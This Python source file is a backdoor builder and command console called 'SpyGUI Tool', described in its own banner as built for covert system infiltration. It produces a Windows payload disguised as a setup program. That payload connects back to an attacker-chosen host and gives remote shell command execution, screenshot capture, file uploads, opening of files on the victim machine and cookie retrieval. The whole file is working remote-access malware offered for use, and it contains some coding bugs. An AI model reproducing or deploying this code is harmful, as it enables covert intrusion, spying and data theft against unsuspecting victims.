try:
    import random
    import pyfiglet
    from pyfiglet import Figlet
    import socket
    import os
except Exception as e:
    print(f"Error : {e}")
    os.system('pip3 install pyfiglet')

lhost = ""
lport = ""
rhost = ""
rport = ""
file_name = ""

bytes = random.randint(10000, 20000)

os.system('cls' if os.name == 'nt' else 'clear')
fonts = Figlet(font='slant')
print(fonts.renderText('SpyGUI Tool'))
print("""
Description : SpyGUI is a Python-based backdoor tool with a file format in Python, designed for covert system infiltration.

Command         Description
--------       -------------
 help           Helping Tool
""")
while True:
    c2_input = input("spygui > ")
    if c2_input == "lport" or c2_input == "lport ":
        lport = int(input("Set LPORT > "))
        print(f"[+] Set LPORT {lport} success")

    if c2_input == "rport" or c2_input == "rport ":
        rport = int(input("Set RPORT > "))
        print(f"[+] Set RPORT {rport} success")

    if c2_input == "rhost" or c2_input == "rhost ":
        rhost = input("Set RHOST > ")
        print(f"[+] Set RHOST {rhost} success")

    if c2_input == "lhost" or c2_input == "lhost ":
        lhost = input("Set LHOST > ")
        print(f"[+] Set LHOST {lhost} success")

    if c2_input == "build" or c2_input == "build ":
        if not lhost:
            print("[-] Please Set LHOST command 'lhost'...")
        if not lport:
            print("[-] Please Set LPORT, command 'lport'...")
        if not rhost:
            print("[-] Please Set RHOST, command 'rhost'...")
        if not rport:
            print("[-] Please Set RPORT, command 'rport'...")
        else:
            file_name = input("Set File Name > ")
            payload = """
try:
    import mss
    import sys
    import socket
    import subprocess
    import os
    import pyfiglet
    import platform
    import json
    from pyfiglet import Figlet
except:
    import os
    os.system('pip3 install mss')
    os.system('pip3 install pyfiglet')

if os.name == 'nt':
    print("System Passed")
else:
    print("Tool Not Working Your System")
    print("Is Tool Working for windows")
    exit()
fonts = Figlet(font='slant')
print(fonts.renderText('Starting Setup Tool'))
print("Waiting 10-15 min")

host = "{rhost}"
port = {rport}
try:
    while True:
        settings_connect = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM
        )
        settings_connect.connect((host, port))
        s = settings_connect
        while True:
            output = s.recv(9024)
            output_de = output.decode()
            if "sysinfo" in output_de:
                data = str(platform.uname())
                s.sendall(data.encode())

            if "shell" in output_de:
                get_path = "pwd"
                path = subprocess.Popen(
                    get_path,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                pwd = path.stdout.read() + path.stderr.read()
                s.send(pwd.encode())
                while True:
                    op_de = s.recv(9024).decode()
                    if op_de == 'exit':
                        print("Setup Failed")
                        exit()
                    output_shell = subprocess.Popen(
                        op_de,
                        shell=True,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE
                    )
                    work = output_shell.stdout.read + output_shell.stderr.read()
                    s.send(work.encode())

            if "messenge" in output_de:
                listen_mess = s.recv(9024)
                byte_decode = listen_mess.decode()
                os.system("echo > setup.vbs")
                with open('setup.vbs', 'w') as save:
                    data = 'msgbox("' + byte_decode + '")'
                    save.write(data)
                    for open_tab_mess in range(10):
                        os.system('setup.vbs')
                    os.remove("setup.vbs")

            if "screenshot" in output_de:
                with mss.mss() as screenshot:
                    screenshot.shot(output='default.png')
                with open('default.png', 'rb') as noti_file:
                    screenshot_data = noti_file.read()
                s.sendall(screenshot_data)
                os.system("echo 123 > default.png")
                os.remove("default.png")
            
            if "dir" in output_de:
                cmd = s.recv(1024).decode()
                shell_start = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                data = shell_start.stdout.read() + shell_start.stderr.read()
                s.send(data)

            if "upload" in output_de:
                read_file = s.recv(100024)
                formats = s.recv(1024).decode()
                with open("upload_123.html", 'wb') as save:
                    save.write(read_file)
            
            if "open" in output_de:
                file = s.recv(2024)
                file = str(file.decode())
                os.system(file)
            
            if "get cookie" in output_de:
                url = s.recv(2024).decode()
                import requests
                def get():
                    response = requests.get(url)
                    cookie = response.cookies.get_dict()
                    cook = cookie
                    if cook:
                        json_cookie = json.dumps(cook)
                        s.send(json_cookie.encode())
                    else:
                        s.send(b"[+] Failed Get Cookie")
                get()

            else:
                pass
except Exception as e:
    print(e)
    exit("[+] Setup Error")
""".format(rhost=rhost, rport=rport)
        os.system(f'echo > ./build/{file_name}.py')
        with open(f"./build/{file_name}.py", 'w') as builds:
            builds.write(payload)
            print("[+] File Saved To : ./build/{file_name}.py".format(file_name=file_name))
    if c2_input == "exploit" or c2_input == "exploit " or c2_input == "run" or c2_input == "run ":
        if not file_name:
            print("Please SET FILE_NAME...")
        else:
            s = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
            )
            s.setsockopt(
                socket.SOL_SOCKET,
                socket.SO_REUSEADDR,
                1
            )
            s.bind((lhost, lport))
            s.listen(1)
            print("[+] Starting Server On Port", lport)
            conn, addr = s.accept()
            print(f"[+] {addr[0]}:{addr[1]} --> {lhost}:{lport} {bytes} Bytes")
            print(f"[+] Starting Reverse Shell {addr[0]}:{addr[1]} --> {lhost}:{lport} {bytes} Bytes")
            print(f"[+] Command 'help' for helping reverse shell")
            print("")
            while True:
                shell_command = input("reverse_shell@spygui ~> ")
                if shell_command == "help":
                    print("""
Command         Description
--------        ------------
 help           helping reverse
 screenshot     screenshot victim
 shell          start command prompt
 messenge       show messenge to victim
 sysinfo        show information computer
 exit           exit reverse

Shell Command
--------------
 dir            show file
 upload         uplad file
 cat            cat file
 pwd            get path
 getuid         get user id
 open           open file from victim
 get cookie     get cookie web server

""")
                if shell_command == "get cookie":
                    import json
                    conn.send(b"get cookie")
                    web = input("Enter website for get : ")
                    print("[+] Packet Success")
                    conn.send(web.encode())
                    list_cook = conn.recv(9024)
                    cookie = json.loads(list_cook.decode())
                    print(f"\n{cookie}\n")

                if shell_command == "open":
                    conn.send(b"open")
                    file = input("Enter Your Path File Open ( ex : C:\Windows\hacked.vbs ) >> ")
                    conn.send(file.encode())
                    print("[+] Sending Success")

                if shell_command == "upload":
                    path_file = input("Enter Your Path File > ")
                    with open(f"{path_file}", 'rb') as reader_doc:
                        docs = reader_doc.read(100024)
                        print("[+] Start Upload...")
                        print("[+] Sending To Target Success")
                        print(f"[+] file : upload_123.html")

                if shell_command == "dir":
                    conn.send(b"dir")
                    cmd = input("Enter Path Victims ( Default : C:\Windows\System32 ) >>> ")
                    conn.send(cmd.encode())
                    output = conn.recv(90024)
                    print("[+] Sending Success")
                    print(f"\n{output.decode()}\n")
                
                if shell_command == "screenshot":
                    conn.send(b"screenshot")
                    output = conn.recv(9000024)
                    os.system(f'echo "" > victim_{addr[1]}.png')
                    with open(f'victim_{addr[1]}.png', 'wb') as save:
                        save.write(output)
                        print("[+] Sending packet To Victim")
                        print("[+] Screenshot Success")
                        print(f"[+] Image Saved To : victim_{addr[1]}.png")

                if shell_command == "shell":
                    print("Starting Command Prompt, CMD")
                    while True:
                        shell = input("shell > ")
                        if shell == "exit":
                            conn.send(b"exit")
                            exit("[+] Reverse Stoped By Attacker")
                        else:   
                            conn.send(shell.encode())
                            output = conn.recv(90024)
                            print(f"\n{output.decode()}")

                if shell_command == "messenge":
                    conn.send(b"messenge")
                    mess = input("Enter Messeege : ")
                    conn.send(mess.encode())
                    print("[+] Default Open Tab : 10")
                    print("[+] Sending Messenger Success")

                if shell_command == "sysinfo":
                    conn.send(b"sysinfo")
                    syss = conn.recv(9024)
                    d = syss.decode()
                    unames = d.replace('uname_result', '').replace("(", "").replace(")", "")
                    uname = unames.replace("'", "").replace(",", "\n")
                    a = uname.replace('=', ' : ')
                    print(f"\n{a}\n")

                else:
                    pass
    if c2_input == "help" or c2_input == "help ":
        print("""

Command         Description
--------       -------------
 build         Build Format File Backdoor
 generator     build shortcut Format File Backdoor
 lhost         set local host server
 lport         set local port server
 rhost         set remote host client
 rport         set remote port client
 option        show options settings

exploit
-------
 exploit       start exploit
 run           exploit shortcut

Server
------
 show inet     Show Inet

""")
    if c2_input == "option" or c2_input == "option " or c2_input == "options":
        print(f"""
Mode Name              Option
----------           ------------
LHOST                {lhost}
LPORT                {lport}
RHOST                {rhost}
RPORT                {rport}
FILE_NAME            {file_name}
""")
    if c2_input == "show inet":
        os.system('ipconfig' if os.name == 'nt' else 'ifconfig | grep "inet"')
    if c2_input == "exit":
        print("[+] Thanks For Using Tool")
        exit("[+] Exit By User")
    else:
        pass
